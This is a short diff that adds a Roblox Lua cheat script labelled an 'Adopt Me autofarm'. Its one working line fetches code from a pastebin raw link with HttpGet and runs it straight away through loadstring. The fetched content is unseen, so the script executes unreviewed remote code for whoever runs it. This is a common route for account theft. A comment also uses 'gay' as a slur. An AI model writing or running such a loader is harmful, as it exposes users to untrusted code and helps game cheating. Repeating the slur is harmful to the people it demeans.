@@ -1,0 +1,3 @@
+-- Adopt Me autofarm. Smh gay games nowadays.
+-- https://t6.rbxcdn.com/eb8b1cc52b848b3b1669c9112e6b75ae
+loadstring(game:HttpGet("https://pastebin.com/raw/Z3iAXASr", true))()
